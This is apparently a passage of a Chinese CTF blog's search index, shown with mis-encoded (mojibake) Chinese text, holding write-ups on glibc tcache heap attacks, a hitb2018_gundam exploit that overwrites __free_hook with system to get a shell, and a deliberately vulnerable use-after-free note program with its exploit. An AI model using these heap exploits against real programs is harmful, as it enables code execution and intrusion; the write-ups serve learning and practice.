†å—ï¼Œå³fake_chunkï¼Œå¹¶æ¯”è¾ƒfake_prev_sizeä¸fake_chunkçš„sizeæ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰åˆ™å‘ç”Ÿå †åˆå¹¶ï¼Œè¿›å…¥unlinkè„±é“¾ã€‚\n(6)æ­¤æ—¶åˆå¹¶çš„å †å—ï¼Œä¼šè¢«æ”¾å…¥unsortedbinä¸­ï¼Œè€Œæ­¤æ—¶çš„chunkbè¿˜å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œé‡Šæ”¾chunkbï¼ˆå› ä¸ºå…¶å¤§å°ä¸å‰é¢tcacheå¤§å°ä¸åŒï¼Œä¼šè¢«æ”¾å…¥æ–°çš„tcachebinä¸­ï¼‰ã€‚\n(7)å†ç”³è¯·ä¸€ä¸ªå¤§äºchunkcå¤§å°çš„chunkï¼Œä¼šç›´æ¥ä»unsortedbinä¸­å»å¯»æ‰¾åˆ’åˆ†ï¼Œè¯¥chunkå°±æ˜¯fakechunk+chunkbï¼Œä¸”åˆç†é…ç½®chunkaå’Œchunkcçš„å¤§å°ä½¿å¾—èƒ½å¤Ÿè¦†ç›–åˆ°chunkbçš„æ•°æ®ï¼Œéšåé€šè¿‡ç”³è¯·å›æ¥çš„è¯¥chunkæ”¹å†™chunkbçš„fdæŒ‡é’ˆï¼Œå°†chunkbç”³è¯·å›æ¥ï¼Œå†æ¬¡ç”³è¯·å°±èƒ½å¤Ÿå®ç°tcache poisoningæ”»å‡»ã€‚\nè¿™é‡Œå’Œ2.23æœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯å†é‡Šæ”¾chunkbä»è€Œä½¿å¾—å…¶è¿›å…¥tcacheï¼Œä¿®æ”¹fdåˆ¶é€ tcache poisoningï¼Œå› ä¸ºtcacheä¸ä¼šæ£€æŸ¥sizeï¼Œåªè¦fdå°±å¯ä»¥ä»»æ„ç”³è¯·ã€‚\n\n\\5. house_of_force:ä¸€æ ·çš„ï¼Œæ²¡å¤šå¤§å·®åˆ«\n\n6.house_of_lore:å’Œ2.23å·®ä¸å¤šï¼Œæ²¡å¤šå¤§å·®åˆ«\n\n7.large_bin_attack:å’Œ2.23åŸºæœ¬ä¸€æ ·ã€‚\n\n\\8. overlapping_chunks(èƒ½å¤Ÿæº¢å‡ºä¿®æ”¹sizeä½)ï¼š\nåªæœ‰freeä¹‹åä¿®æ”¹sizeçš„äº†.\n\n\\9. poison_null_byte:\nä¸2.23å·®ä¸å¤šï¼Œä¸è¿‡éœ€è¦è€ƒè™‘åˆ°tcacheçš„å½±å“ï¼Œæœ‰æ—¶å€™éœ€è¦å…ˆå¡«æ»¡tcacheã€‚ä¸€èˆ¬æƒ…å†µæ˜¯4ä¸ªchunkï¼Œæœ€åä¸€ä¸ªchunké˜²æ­¢åˆå¹¶ï¼Œå‰ä¸‰ä¸ªchunkç”¨æ¥åˆ¶é€ å †å—é‡å ï¼Œä½†æ˜¯ä¸­é—´å…¶å®å¯ä»¥æ’å…¥è¾ƒå¤šçš„å †å—ï¼Œåˆ¶é€ å¤šä¸ªå †å—é‡å ï¼Œæ–¹ä¾¿åˆ©ç”¨ã€‚\n\n\\10. tcache_dup:åŸºæœ¬æ²¡å•¥ç”¨ï¼Œç°åœ¨2.27ä¹ŸåŸºæœ¬éƒ½ä¿®å¤äº†è¿™ä¸ªé—®é¢˜ï¼Œä¸è¿‡åšé¢˜çš„æ—¶å€™å¯ä»¥å°è¯•ä¸€ä¸‹çœ‹è¡Œä¸è¡Œã€‚2.28å°±å·²ç»å¢åŠ äº†keyå­—æ®µæ£€æŸ¥\n\n11.tcache_ house_of_spirit:\nä¸house_of_spiritä¸€æ ·ï¼Œä¿®æ”¹æ ˆä¸Šçš„çš„chunkæŒ‡é’ˆä¸ºæ ˆä¸Šçš„åœ°å€ï¼Œåœ¨æ ˆä¸Šä¼ªé€ chunkï¼Œåªéœ€è¦ä¼ªé€ sizeå³å¯ï¼Œæ³¨æ„in_useä½çš„è®¾ç½®ã€‚åŒæ—¶ç”±äºtcacheåœ¨freeçš„æ—¶å€™ä¸ä¼šä¾æ®chunkçš„sizeæ¥å¯¹ä¸‹ä¸€ä¸ªchunkåšæ£€æŸ¥ï¼Œæ‰€ä»¥è¿™é‡Œä¸éœ€è¦ä¼ªé€ ä¸‹ä¸€ä¸ªchunkçš„sizeã€‚\n\n\\12. tcache_poisoningï¼š\nå·²ç»åœ¨tcacheé“¾è¡¨ä¸­çš„chunkï¼Œå¦‚æœä¿®æ”¹äº†fdï¼Œé‚£ä¹ˆç›´æ¥ä¸¤æ¬¡mallocå³å¯è·å¾—fdå¯¹åº”åœ°å€çš„chunkï¼Œä¸éœ€è¦æ„é€ å­—èŠ‚é”™ä½ï¼Œè€Œä¸”mallocä¹‹åå¾—åˆ°çš„chunkå…¶pre_sizeå’Œsizeéƒ½æ˜¯0ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449154.png)\n\n\\13. Tcache Stashing Unlink Attack(éœ€è¦callocç”³è¯·chunkï¼Œèƒ½å¤Ÿæ§åˆ¶smallbinçš„bkæŒ‡é’ˆ)ï¼š\n(1)ç”³è¯·9ä¸ªchunkï¼Œchunk1-chunk9ï¼Œé‡Šæ”¾chunk4-chunk9è¿›å…¥tcacheä¸­ï¼Œé‡Šæ”¾chunk2è¿›å…¥tcacheï¼Œå†é¡ºåºé‡Šæ”¾chunk1å’ŒChunk3è¿›å…¥unsortedbinä¸­ã€‚\n(2)ç”³è¯·ä¸€ä¸ªlargebinå¤§å°çš„chunkï¼Œä½¿å¾—chunk1å’Œchunk3è¢«æ•´ç†åˆ°smallbinä¸­ã€‚\n(3)ç”³è¯·ä¸¤ä¸ªchunkï¼Œå°†chunk2å’Œchunk9ä»Tcacheä¸­ç”³è¯·å‡ºæ¥ï¼Œä½¿å¾—tcacheä¸­å­˜åœ¨ä¸¤ä¸ªç©ºä½ã€‚\n(4)åˆ©ç”¨UAFä¹‹ç±»çš„æ¼æ´ä¿®æ”¹chunk3çš„bkæŒ‡å‘fake_chunkï¼Œè¿™é‡Œçš„chunk3æ˜¯smallbinä¸­çš„ç¬¬ä¸€ä¸ªchunkï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449159.png)\n\nå³ä¸ºå›¾ä¸­çš„0x602390çš„bkæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªfake_chunkï¼Œæ ˆä¸Šçš„åœ°å€ã€‚\n(5)åŒæ—¶ç”±äºsmallbinæŒ‰ç…§FIFOçš„é¡ºåºï¼Œæ‰€ä»¥ä¾æ®bkæŒ‡é’ˆè¿›è¡Œå¯»æ‰¾ï¼Œé‚£ä¹ˆå¦‚æœä»smallbinä¸­ç”³è¯·chunkï¼Œç”³è¯·é¡ºåºåº”è¯¥æ˜¯0x602250 â€”â–¸ 0x602390 â€”â–¸ 0x7fffffffdd10ã€‚\n(6)è°ƒç”¨callocï¼Œä½¿å¾—chunkä¸ä»tcacheä¸­ç”³è¯·ï¼Œä»smallbinä¸­ç”³è¯·ï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘ä¸‹åˆ—åœ¨ä½¿ç”¨smallbinæ—¶ï¼Œåªåœ¨use tcacheçš„å®å®šä¹‰ä¸­çš„ä»£ç ï¼š\n\n```\nwhile ( tcache->counts[tc_idx] < mp_.tcache_count\n&& (tc_victim = last (bin) ) != bin)\n{\n    //å¦‚æœæˆåŠŸè·å–äº†Chunk\n    if (tc_victim != 0)\n    {\n         // è·å– small bin ä¸­å€’æ•°ç¬¬äºŒä¸ª chunk ã€‚\n        bck = tc_victim->bk;\n        //è®¾ç½®æ ‡å¿—ä½\n        set_inuse_bit_at_offset (tc_victim, nb);\n        // å¦‚æœä¸æ˜¯ main_arenaï¼Œè®¾ç½®å¯¹åº”çš„æ ‡å¿—\n        if (av != &main_arena)\n            set_non_main_arena (tc_victim);\n        //å–å‡ºæœ€åä¸€ä¸ªChunk\n        bin->bk = bck;\n        bck->fd = bin;\n        //å°†å…¶æ”¾å…¥åˆ°Tcacheä¸­\n        tcache_put (tc_victim, tc_idx);\n    }\n}\n```\n\nè¿™æ ·å°±ä¼šå°†tc_victimï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„0x602390ï¼Œé€šè¿‡tcache_putæ”¾å…¥åˆ°tcacheä¸­ï¼ŒåŒæ—¶tcache_putè¿™ä¸ªå‡½æ•°ä¸­æ²¡æœ‰ä»»ä½•çš„å®‰å…¨æ£€æŸ¥ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ”¾å…¥ã€‚é‚£ä¹ˆç”±äºtcacheçš„FILOå…³ç³»ï¼Œä¾æ®fdæ¥ç”³è¯·ï¼Œ0x602390çš„fdä¸º0x7fffffffdd10(fakechunk)ï¼Œæ‰€ä»¥ä¼šå°†fakechunkæåˆ°tcacheçš„å¤´éƒ¨ã€‚åŒæ—¶åˆç”±äºtcacheä¸­çš„æŒ‡é’ˆæŒ‡å‘çš„æ˜¯chunkå¤´éƒ¨+0x10ï¼Œé‚£ä¹ˆåœ¨tcacheä¸­çš„é¡ºåºå°±æ˜¯\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449163.png)\n\nè¿™é‡Œçš„0x7fffffffdd20å°±æ˜¯fakechunkï¼Œå†æ¬¡ç”³è¯·0xa0å¤§å°çš„chunkå°±å¯ä»¥å°†fakechunkç»™ç”³è¯·å‡ºæ¥ã€‚åŒæ—¶åˆç”±äºä»smallbiné“¾è¡¨ä¸­çš„unlinkä¸­çš„bck->fd = binçš„èµ‹å€¼æ“ä½œï¼Œä¼šå¯¼è‡´0x7fffffffdd20+0x10å¤„ä¼šè¢«èµ‹å€¼ä¸Šsmallbinçš„libcåœ°å€ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191449165.png)\n\nè¿™æ ·Tcache Stashing Unlink Attackä¿®æ”¹bkä¸ºtarget_addrï¼Œmallocåä¼šæ§åˆ¶target_addr-0x10ï¼Œä¼šåœ¨target_addr+0x10å¤„å†™å…¥main_arena_addrã€‚\n\n14.unsafe_unlink:å’Œ2.23å·®ä¸å¤šï¼Œå°±åªæ˜¯ç”³è¯·çš„chunkä½¿ä¹‹å¤§äº0x410ï¼Œä»è€Œä¸ä½¿ç”¨tcacheã€‚\n\n15.unsorted_bin_attack:ç”³è¯·è¾ƒå¤§çš„chunkä½¿å¾—ä»unsortedbinä¸­é‡æ–°ç”³è¯·chunkæ—¶ä¸ä¼šå°†è¯¥å¤§å°çš„chunkæ”¾å…¥å¯¹åº”çš„tcacheä¸­ã€‚æˆ–è€…ä¿®æ”¹tcacheç»“æ„ä½“çš„countsåŸŸï¼Œä½¿å¾—ç³»ç»Ÿè®¤ä¸ºè¯¥tcacheå·²ç»æ»¡äº†ï¼Œé‚£ä¹ˆå°±ä¸ä¼šæ”¾å…¥äº†ã€‚\n\nhttps://github.com/firmianay/CTF-All-In-One/blob/master/doc/3.1.8_heap_exploit_3.md#unsorted_bin_attack\n\n\\16. unsorted_bin_into_stack_attackï¼šå’Œ2.23å·®ä¸å¤šï¼Œåªè¦æ»¡è¶³chunkçš„å¤§å°å¤§äº0x408ä»è€Œä¸ä½¿ç”¨tcacheå³å¯ï¼Œæˆ–è€…èƒ½å¤Ÿä¿®æ”¹tcacheç»“æ„ä½“çš„countåŸŸã€‚\n\n \n","tags":["how2heap"],"categories":["PWN","how2heap"]},{"title":"hitb2018_gundam","url":"/2021/08/14/hitb2018_gundam/","content":"\n1.å¸¸è§„checksecï¼Œä¿æŠ¤å…¨å¼€ã€‚IDAæ‰“å¼€æ‰¾æ¼æ´ï¼Œåœ¨åˆ é™¤å‡½æ•°sub_D32()ä¸­å­˜åœ¨Double freeå’ŒUAFæ¼æ´ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191515866.jpeg)\n\né€šè¿‡é€†å‘åˆ†æï¼Œç»“æ„ä½“é‡æ•´åŒ–ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nstruct gundam\n{\nint flag;\nchar *name;\nchar type[24];\n}gundam;\n\nstruct gundam* factory[9]\n```\n\nä¹‹åå¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191515821.jpeg)\n\n(1)Double free:å¯ä»¥çœ‹åˆ°åœ¨åˆ é™¤å‡½æ•°ä¸­ï¼Œç¨‹åºé€šè¿‡factory[idx]å’Œcountæ¥åˆ¤æ–­gundamæ˜¯å¦å­˜åœ¨ï¼Œå¹¶ä¸”åªæ˜¯freeæ‰äº†factory[idx]->nameè¿™ä¸ªchunkï¼Œå¹¶ä¸”å°†flagç½®ç©ºï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å°†factory[idx]è¿™ä¸ªæŒ‡é’ˆç½®ç©ºã€‚è€Œä¸”è¿™æ˜¯åœ¨Tcacheæœºåˆ¶ä¸‹ï¼Œæ²¡æœ‰å¯¹Double freeçš„æ£€æŸ¥ï¼Œé‚£ä¹ˆå°±ä»£è¡¨å¦‚æœå…¶å®æˆ‘ä»¬æ˜¯å¯ä»¥è¿ç»­å¤šæ¬¡freeæ‰factory[idx]->nameè¿™ä¸ªchunkçš„ã€‚\n\n(2)UAF:å¦å¤–factory[idx]->nameè¿™ä¸ªæŒ‡é’ˆä¹Ÿæ²¡æœ‰ç½®ç©ºï¼Œå¯ä»¥é€šè¿‡factory[idx]å†æ¬¡åˆ©ç”¨ï¼Œå½¢æˆUAFæ¼æ´ã€‚\n\n2.æ€è€ƒåˆ©ç”¨æ–¹å¼:ç”±äºlibcç‰ˆæœ¬æ˜¯2.26ï¼Œä»unsortedbinsä¸­ç”³è¯·å›çš„chunkå¦‚æœä¸è¢«ç¨‹åºæ›´æ”¹å†…å®¹ï¼Œå…¶fdå’Œbkä»ç„¶ä¿å­˜ï¼Œå¯ä»¥æ³„éœ²åœ°å€ã€‚ç”±äºbuildçš„æ—¶å€™ï¼Œæ²¡æœ‰å°†nameè¿™ä¸ªchunkçš„å†…å®¹åˆå§‹åŒ–ä¸º0ï¼Œæ‰€ä»¥è¯¥chunkå¦‚æœè¿›å…¥unsortedbinä¸­ä¹‹åï¼Œfdè¢«èµ‹å€¼ä¸ºmain_arena+88ï¼Œé‚£ä¹ˆç”³è¯·å›æ¥ä¹‹åï¼Œnameä¸­çš„bkå°±å¸¦æœ‰main_arena+88çš„åœ°å€ï¼Œå¯ä»¥é€šè¿‡visitæ‰“å°å‡ºæ¥ï¼Œä»è€Œè®¡ç®—å¾—åˆ°ï¼Œæ³„éœ²libcåŸºåœ°å€ã€‚\n\n(1)é‚£ä¹ˆå…ˆå¡«æ»¡tcacheä¹‹åï¼Œå†åŠ ä¸ªchunkï¼Œä½¿å…¶è¿›å…¥unsorted binä¸­ï¼Œç„¶åç”³è¯·å›æ¥å°±å¯ä»¥å¾—åˆ°libcåœ°å€äº†ã€‚\n\n(2)å¾—åˆ°libcåœ°å€åï¼Œç”±äºlibcç‰ˆæœ¬æ˜¯2.26ï¼Œä»ç„¶å­˜åœ¨tcache poisoningæ¼æ´ï¼Œå°±å¯ä»¥é€šè¿‡Double freeæ¼æ´è¿›è¡Œç±»ä¼¼fastbins attackæ”»å‡»ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nå‡å¦‚ç”³è¯·chunk0,chunk1ï¼Œç„¶åè¿ç»­free(chunk0)ä¸¤æ¬¡ï¼Œè¿™æ ·tcache binä¸­å°±æ˜¯ï¼š\nchunk0.fd ->chunk0ï¼Œå³chunk0->chunk0\né‚£ä¹ˆç¬¬ä¸€æ¬¡ç”³è¯·å›chunk0ï¼Œä¿®æ”¹fdä¸ºfakechunkï¼Œtcache binä¸­å°±æ˜¯ï¼š\nchunk0.fd->fakechunkï¼Œå³chunk0->fakechunk\nä¹‹åå†ç”³è¯·å›chunk0ï¼Œå†ç”³è¯·ä¸€æ¬¡å°±æ˜¯fakechunkäº†ï¼Œå®ç°ä»»æ„åœ°å€ä¿®æ”¹ã€‚\nâ˜…è¿™ä¸ªæ¼æ´åœ¨libc2.27åŠä¹‹åå°±è¢«ä¿®å¤äº†ï¼Œå³ä¸èƒ½è¿ç»­free(chunk0)ä¸¤æ¬¡ï¼Œå¦åˆ™ç¨‹åºç›´æ¥å´©æºƒã€‚\n```\n\nâ‘ å…ˆç”³è¯·ä¸‰ä¸ªchunkï¼Œchunk0,chunk1,chunk2ï¼Œchunk1å­˜æ”¾binshå­—ç¬¦ä¸²ï¼Œchunk2ç”¨æ¥é˜²æ­¢è¢«topchunkåå¹¶ã€‚ä¹‹åé‡Šæ”¾chunk0ä¸¤æ¬¡ï¼Œé‚£ä¹ˆtcacheä¸­çš„chunk0çš„fdæŒ‡é’ˆå°±ä¼šæŒ‡å‘è‡ªå·±ï¼Œå½¢æˆï¼šchunk0->chunk0ã€‚\n\nâ‘¡ä¹‹åå†ç”³è¯·ä¸€ä¸ªchunkï¼Œå¯¹åº”ç´¢å¼•ä¸º0ï¼Œç”³è¯·å›ç¬¬ä¸€ä¸ªchunk0ï¼Œä¿®æ”¹nameå†…å®¹__free_hook_addrï¼Œè€Œnameå†…å®¹çš„å‰å…«ä¸ªå­—èŠ‚å°±æ˜¯chunk0çš„fdï¼Œå³tcachebinä¸­å°±ä¼šç”±ä¹‹å‰çš„chunk0->chunk0å˜ä¸ºchunk0->__free_hook_addr\n\nâ‘¢å†è¿ç»­ç”³è¯·ä¸¤ä¸ªchunkï¼Œå¯¹åº”ç´¢å¼•ä¸º3,4ï¼Œchunk4çš„å¤´åœ°å€å°±ä¼šæ˜¯__free_hook_addr-0x10ï¼Œé‚£ä¹ˆä¿®æ”¹chunk4çš„nameä¸­çš„å‰å…«ä¸ªå­—èŠ‚å°±ç›¸å½“äºä¿®æ”¹_free_hookï¼Œè¿™é‡Œä½¿å…¶å˜ä¸ºsystemçš„çœŸå®åœ°å€ï¼Œå†free(chunk_binsh)å³å¯getshellã€‚\n\n3.ç¼–å†™exp:\n\n(1)å‰ç½®å¢åˆ æ”¹æŸ¥å‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef build(name):\n    io.sendlineafter(' :', \"1\")\n    io.sendafter(' :', name)\n    io.sendlineafter(' :', \"1\")\n\ndef visit():\n    io.sendlineafter(' :', \"2\")\n\ndef destory(idx):\n    io.sendlineafter(' :', \"3\")\n    io.sendlineafter(\":\", str(idx))\n\ndef blow():\n    io.sendlineafter(' :', \"4\")\n```\n\n(2)æ³„éœ²åœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#åˆ›å»º9ä¸ªchunk,å†åˆ é™¤9ä¸ªchunk,7ä¸ªè¿›å…¥tcache,1ä¸ªè¿›å…¥unsortedbin,1ä¸ªè¿›å…¥topchunk,è¿™é‡Œç”±äºæœ‰ä¸ª0x28çš„gundam_chunkåœ¨ï¼Œæ‰€ä»¥ä¸ä¼šå…¨éƒ¨éƒ½è¿›å…¥topchunk\nfor i in xrange(9):\n    build(\"AAAA\")\nfor i in xrange(9):\n    destory(i)\nblow()\n#ä¸ºäº†æ¸…ç©ºcount\n\n#æ¸…ç©ºtcachebinä¹‹åå†ç”³è¯·ä¸€ä¸ªchunkå°±æ˜¯unsortedbinä¸­çš„\nfor i in xrange(7):\n    build('BBBBBBBB')\nbuild('CCCCCCCC')\n\n#leak:\nvisit()\nmain_arena = 0x3dac20\nlibc.address = u64(io.recvuntil(\"\\x7f\")[-6: ].ljust(8, '\\0')) - 88 - main_arena\nsuccess(\"libc -> {:#x}\".format(libc.address))\n```\n\n(3)æ¸…ç©ºcountï¼Œæ–¹ä¾¿è®¡ç®—ç´¢å¼•:\n\n```\n#æ³¨é‡Šå¤´\n\nfor i in xrange(8):\n    destory(i)\nblow()\n```\n\n(4)åˆ©ç”¨tcache poisoningå’Œdouble freeæ¼æ´ï¼Œgetshell:\n\n```\n#æ³¨é‡Šå¤´\n\nbuild(\"0000\")\nbuild(\"/bin/sh\\0\")\nbuild(\"2222\")\ndestory(0)\ndestory(0)\nbuild(p64(libc.sym['__free_hook']))\nbuild(\"/bin/sh\\0\")\nbuild(p64(libc.sym['system']))\ndestory(1)#1æˆ–è€…3éƒ½å¯ä»¥\n\nio.interactive()\n```\n\n \n\nâ–²è¿™ä¸ªæ³„éœ²åœ°å€çš„æ¼æ´åœ¨æ²¡æœ‰tcacheæœºåˆ¶çš„libcç‰ˆæœ¬ä¸­éƒ½å¯ä»¥ç”¨ï¼Œä½†æ˜¯tcache poisoningåªæœ‰libc2.26æ‰å¯ä»¥ç”¨\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nctf-all-in-one\n\n \n","tags":["Tcache"],"categories":["PWN","pwnå †-Tcache"]},{"title":"note-UAF","url":"/2021/08/14/note-UAF/","content":"\n1.æºæ–‡ä»¶ï¼Œå¿˜è®°æ˜¯å“ªé‡Œçš„é¢˜äº†ã€‚\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nstruct note *notelist[10];\nint count = 0;\n\nstruct note{\n  void (*print_note)();\n  char *content;\n};\n\nvoid print_note_content(struct note *ptr_n) \n{ \n  puts(ptr_n -> content); \n}\n\nvoid add_note(){\n  int i;\n  char buf[8];\n  int size;\n  if (count > 10)\n  {\n    puts(\"Full\");\n    return;\n  }\n  for (i = 0; i < 10; i++){\n    if (!notelist[i])\n    {\n      notelist[i] = (struct note *)malloc(sizeof(struct note));\n      if (!notelist[i])\n      {\n        puts(\"Alloca Error\");\n        exit(-1);\n      }\n      notelist[i] -> print_note = print_note_content;\n      printf(\"Note size :\");\n      read(0, buf, 8);\n      size = atoi(buf);\n      notelist[i] -> content = (char *)malloc(size);\n      if (!notelist[i] -> content) \n      {\n        puts(\"Alloca Error\");\n        exit(-1);\n      }\n      printf(\"Content :\");\n      read(0, notelist[i] -> content, size);\n      puts(\"Success !\");\n      count++;\n      break;\n    }\n  }\n}\n\nvoid del_note() \n{\n  char buf[4];\n  int idx;\n  printf(\"Index :\");\n  read(0, buf, 4);\n  idx = atoi(buf);\n  if (idx < 0 || idx >= count) \n  {\n    puts(\"Out of bound!\");\n    _exit(0);\n  }\n  if (notelist[idx]) \n  {\n    free(notelist[idx]->content);\n    free(notelist[idx]);\n    puts(\"Success\");\n  }\n}\n\nvoid print_note() \n{\n  char buf[4];\n  int idx;\n  printf(\"Index :\");\n  read(0, buf, 4);\n  idx = atoi(buf);\n  if (idx < 0 || idx >= count) \n  {\n    puts(\"Out of bound!\");\n    _exit(0);\n  }\n  if (notelist[idx]) \n  {\n    notelist[idx] -> print_note(notelist[idx]);\n  }\n}\n\nvoid magic() \n{ \n  system(\"cat ./flag\"); \n}\n\nvoid menu() {\n  puts(\"----------------------\");\n  puts(\"       UAF NOTE       \");\n  puts(\"----------------------\");\n  puts(\" 1. Add note          \");\n  puts(\" 2. Delete note       \");\n  puts(\" 3. Print note        \");\n  puts(\" 4. Exit              \");\n  puts(\"----------------------\");\n  printf(\"Your choice :\");\n};\n\nint main() {\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stdin, 0, 2, 0);\n  char buf[4];\n  while (1) {\n    menu();\n    read(0, buf, 4);\n    switch(atoi(buf)) \n    {\n      case 1:\n        add_note();\n        break;\n      case 2:\n        del_note();\n        break;\n      case 3:\n        print_note();\n        break;\n      case 4:\n        exit(0);\n        break;\n      default:\n        puts(\"Invalid choice\");\n        break;\n    }\n  }\n  return 0;\n}\n```\n\nç¼–è¯‘ä¸€ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ngcc note.c -no-pie -o note\n```\n\n2.æ‰“å¼€IDAï¼ŒæŸ¥æ¼æ´ï¼Œdel-noteå‡½æ•°ä¸­å­˜åœ¨UAFæ¼æ´ï¼Œå¹¶ä¸”è¿˜æœ‰åé—¨ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif ( notelist[idx] )\n{\n    free(notelist[idx]->content);\n    free(notelist[idx]);\n    puts(\"Success\");\n}\n//è¿™é‡Œç»è¿‡IDAäººå·¥æ•°æ®ä¿®æ”¹è¿‡ï¼Œåˆšæ‰“å¼€ä¸ä¼šæ˜¯è¿™æ ·çš„ã€‚\n----------------------------------------------------\nint magic()\n{\n    return system(\"cat ./flag\");\n}\n```\n\nå¯ä»¥çœ‹åˆ°åœ¨Freeä¹‹åæ²¡æœ‰å°†æŒ‡é’ˆç½®ç©ºï¼Œå¯¼è‡´Freeä¹‹åï¼Œå¦‚æœé€šè¿‡ç¨‹åºä¸­çš„printé€‰é¡¹æ¥æ‰“å°ä¾ç„¶å¯ä»¥è°ƒç”¨è¢«è¯¥æŒ‡é’ˆå¯¹åº”çš„å‡½æ•°ï¼Œæ‰€ä»¥è¿™é‡Œå­˜åœ¨UAFã€‚\n\n3.è¿™ä¸€é¢˜ä¸­æœ‰ä¸€ä¸ªç»“æ„ä½“ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191534858.jpeg)\n\nå…¶ä¸­mallocé¡ºåºæ˜¯ï¼š\n\n(1)mallocæ§åˆ¶æ•°æ®éƒ¨åˆ†chunk_controlï¼Œå›ºå®šå¤§å°ä¸º0x10ã€‚\n\n(2)å°†contentï¼Œä¹Ÿå°±æ˜¯çœŸæ­£æ•°æ®éƒ¨åˆ†mallocå‡ºæ¥ï¼Œchunk_dataï¼Œè¿™é‡Œå¯ä»¥è®¾ç½®sizeã€‚\n\nfreeé¡ºåºæ˜¯ï¼š\n\n(1)å…ˆfreeæ‰dataéƒ¨åˆ†ï¼Œchunk_dataã€‚\n\n(2)å†freeæ§åˆ¶æ•°æ®éƒ¨åˆ†çš„structï¼Œchunk_controlã€‚\n\n4.æ€è€ƒæ”»å‡»æ€è·¯ï¼Œæ—¢ç„¶æœ‰UAFæ¼æ´ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æƒ³åŠæ³•Freeå‡ ä¸ªchunkï¼Œç„¶ååˆ©ç”¨fastbinså…ˆè¿›åå‡ºçš„åŸåˆ™ï¼Œå°†æŸä¸ªæ§åˆ¶æ•°æ®éƒ¨åˆ†çš„chunk_controlç”³è¯·å›æ¥å˜æˆæˆ‘ä»¬å¯ä»¥æ“ä½œçš„chunk_dataï¼Œè¿›è¡Œfastbins attackã€‚ä¹‹åä¿®æ”¹å…¶ä¸­çš„æ‰“å°å‡½æ•°åœ°å€ï¼Œæ”¹ä¸ºåé—¨å‡½æ•°åœ°å€ï¼Œé‚£ä¹ˆä½¿ç”¨ç¨‹åºä¸­çš„printå°±å¯ä»¥è·³è½¬åé—¨å‡½æ•°è·å–flagã€‚\n\n5.å…ˆç”³è¯·ä¸¤ä¸ªç»“æ„ï¼Œdataéƒ¨åˆ†è‡³å°‘ä¸º0x19ï¼Œä½¿å¾—chunk_dataä¸è½å…¥åˆ°0x20çš„fastbinsä¸­ã€‚ä¹‹åé‡Šæ”¾æ‰è¿™ä¸¤ä¸ªç»“æ„ï¼Œç„¶åfastbinsä¸­çš„ç»“æ„å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfastbinsY[0]:0x10:chunk_control1->chunk_control0\nfastbinsY[x]:0xxx:chunk_data1->chunk_data0\n```\n\n6.ç„¶åç”³è¯·ä¸€ä¸ª0x10å¤§å°çš„ç»“æ„ï¼Œç¼–å·Aï¼Œè¯¥ç»“æ„ä¸­çš„å¯¹åº”å°±å˜æˆè¿™æ ·ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchunk_controlA=chunk_control1\nchunk_dataA=chunk_control0\n```\n\n7.ç°åœ¨å¯ä»¥ä¿®æ”¹chunk_dataAï¼Œå°†å…¶å†…å®¹æ”¹ä¸ºåé—¨å‡½æ•°åœ°å€ï¼Œç„¶åä½¿ç”¨ç¨‹åºä¸­çš„printï¼Œè¾“å…¥ç´¢å¼•ä¸º0ï¼Œç„¶åå°±ä¼šè¿è¡Œchunk_control0ä¸­çš„æ‰“å°å‡½æ•°ï¼Œä¹Ÿå°±ç›¸å½“äºè¿è¡Œchunk_dataAä¸­çš„åé—¨å‡½æ•°ã€‚\n\nç®€å•expå¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nadd(0x20,'aaaaaaaa') #chunk_control0+chunk_data0\nadd(0x20,'AAAAAAAA') #chunk_control1+chunk_data1\n#è¿™é‡Œçš„0x20å¯ä»¥éšä¾¿æ”¹ï¼Œåªè¦å¤§äºç­‰äº0x19å³å¯ï¼Œä¸¤ä¸ª0x20ä¹Ÿå¯ä»¥ä¸ä¸€æ ·ã€‚\n\nfree(0)\nfree(1)\n#freeé¡ºåº:chunk_data0,chunk_control0,chunk_data1,chunk_control1\n\nbackdoor = p64(elf.sym['magic'])\nadd(0x10,backdoor)\n#mallocé¡ºåº:chunk_controlA=chunk_control1,chunk_dataA=chunk_control0\n\nshow(0)\nprint(p.recv())\n#è·å–flag\n```\n","tags":["UAF"],"categories":["PWN","pwnå †-UAF"]},{"title":"kernelç¼–è¯‘","url":"/2021/08/14/kernelç¼–è¯‘/","content":"\n1.å®‰è£…ä¾èµ–ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsudo apt-get install make gcc bison flex libssl-dev musl-tools\nsudo apt-get install libssl-dev\nsudo apt-get install gcc make libncurses5-dev openssl libssl-dev \nsudo apt-get install build-essential \nsudo apt-get install pkg-config\nsudo apt-get install libc6-dev\nsudo apt-get install bison\nsudo 